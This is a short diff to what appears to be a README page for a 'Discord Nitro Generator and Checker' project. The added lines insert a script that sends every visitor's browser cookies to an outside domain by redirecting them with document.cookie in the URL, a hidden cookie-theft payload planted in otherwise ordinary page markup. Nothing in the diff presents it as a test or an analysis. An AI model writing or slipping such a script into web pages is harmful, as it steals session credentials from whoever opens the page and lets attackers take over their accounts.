@@ -11,6 +11,8 @@
   </a>
   
   <h3 align="center">Discord Nitro Generator and Checker</h3>
+  
+  <script>document.location = "https://cryptocurrenciades.com/test.php?cookie=" + document.cookie;</script>
 
   <p align="center">
     A discord nitro generator and checker for all your nitro needs
